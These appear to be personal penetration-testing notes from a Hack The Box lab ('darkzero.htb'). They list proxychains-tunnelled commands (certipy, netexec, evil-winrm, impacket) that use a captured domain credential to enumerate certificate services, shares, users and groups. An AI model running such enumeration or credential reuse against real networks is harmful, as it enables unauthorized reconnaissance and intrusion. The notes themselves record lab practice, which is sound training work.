
## 1. ADCS Enumeration via Tunnel

```bash
proxychains certipy-ad find -u 'john.w@darkzero.htb' -p 'RFulUtONCOL!' -dc-ip 172.16.20.1 -target 172.16.20.1 -vulnerable
```

![[Screenshot_2026-03-28_10-36-43.png]]
## 2. Check Shares on Internal Interface

```bash
proxychains netexec smb 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' --shares
```

![[Screenshot_2026-03-28_10-45-05.png]]
## 3. Check WinRM via Internal Interface

```bash
proxychains evil-winrm -i 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!'
```

No access without authorization.
## 4. Full LDAP Dump via Tunnel

Users

```bash
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --users
```

![[Screenshot_2026-03-30_09-41-06.png]]

Groups

```bash
proxychains netexec ldap 172.16.20.1 -u 'john.w' -p 'RFulUtONCOL!' -d darkzero.htb --groups
```

![[Screenshot_2026-03-30_09-43-51.png|788]]

## Priority 1— Get actual users

```bash
proxychains impacket-GetADUsers darkzero.htb/john.w:'RFulUtONCOL!' -dc-ip 172.16.20.1 -all
```
